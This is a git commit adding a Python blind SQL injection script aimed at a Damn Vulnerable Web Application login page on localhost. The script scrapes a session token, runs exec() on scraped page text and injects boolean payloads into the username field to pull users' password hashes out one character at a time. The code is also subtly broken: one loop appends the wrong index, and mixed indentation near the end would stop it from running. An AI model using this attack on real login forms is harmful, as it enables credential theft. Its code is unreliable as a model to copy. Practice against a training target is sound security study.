99d46b2e8892d96ec795732ec780092aeb145fed
bbgx <bernardo_bugmann@protonmail.com>
2022-10-03 17:39:06 -0700

    Add blind sql inject modifications

---
+++ blind-sql-inject.py
@@ -0,0 +1,104 @@
+import requests
+import re
+
+total_queries = 0
+charset = "0123456789abcdef"
+target = "http://localhost/login.php"
+needle =  "Welcome to Damn Vulnerable Web Application!"
+
+def injected_query(payload):
+	global total_queries
+
+	r = requests.get(target)
+
+	phpsessid = r.cookies.get('PHPSESSID')
+
+	user_token_html = [x for x in r.text.split('\n') if 'user_token' in x]
+	user_token = [x for x in user_token_html[0].split(' ') if 'value' in x]
+	value=''
+	exec(user_token[0])
+
+	cookies_json = {
+		'PHPSESSID': phpsessid,
+		'security': 'low'
+	}
+	cookies_json = {
+    	'PHPSESSID': phpsessid,
+    	'security': 'low'
+	}
+	r = requests.post(target, data = {
+		"username": "admin' and {}--".format(payload), 
+		"password": "password",
+		"Login": "Login",
+		"user_token": value
+	},
+	cookies=cookies_json)
+	total_queries += 1
+
+	return needle.encode() not in r.content
+
+def boolean_query(offset, user_id, character, operator=">"):
+	payload = "(select hex(substr(password,{},1)) from users where user_id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
+	return injected_query(payload)
+
+def invalid_user(user_id):
+	payload = "(select user_id from users where user_id = {}) >= 0".format(user_id)
+	return injected_query(payload)
+
+def password_lenght(user_id):
+	lenght = 0
+	while True:
+		payload = "(select CHAR_LENGTH(password) from users where user_id = {} and CHAR_LENGTH(password) <= {} limit 1)".format(user_id, lenght)
+		if not injected_query(payload):
+			return lenght
+		lenght += 1
+
+def extract_hash(charset, user_id, password_lenght):
+	found = ""
+	for i in range(0, password_lenght):
+		for j in range(len(charset)):
+			if boolean_query(i, user_id, charset[j]):
+				found += charset[i]
+				break
+	return found
+
+def extract_hash_bst(charset, user_id, password_lenght):
+    found = ""
+    for index in range(0, password_lenght):
+        start = 0
+        end = len(charset) - 1
+        while start <= end:
+            if end - start == 1:
+                if start == 0 and boolean_query(index, user_id, charset[start]):
+                    found += charset[start]
+                else:
+                    found += charset[start +1]
+                break
+            else: 
+                middle = (start + end) // 2
+                if boolean_query(index, user_id, charset[middle]):
+                    end = middle
+                else:
+                    start = middle
+    return found
+
+def total_queries_taken():
+	global total_queries
+	print("\t\t[!] {} total queries!".format(total_queries))
+	total_queries = 0
+
+while True:
+	try:
+		user_id = input("> Enter a user ID to extract the password hash: ")
+		if not invalid_user(user_id):
+			user_password_lenght = password_lenght(user_id)
+			print("\t[-] User {} hash lenght: {}".format(user_id, user_password_lenght))
+			total_queries_taken()
+			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_lenght)))
+			total_queries_taken()
+			print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_lenght)))
+            total_queries_taken()
+        else:
+			print("\t[X] User {} does not exist!".format(user_id))
+	except KeyboardInterrupt:
+		break
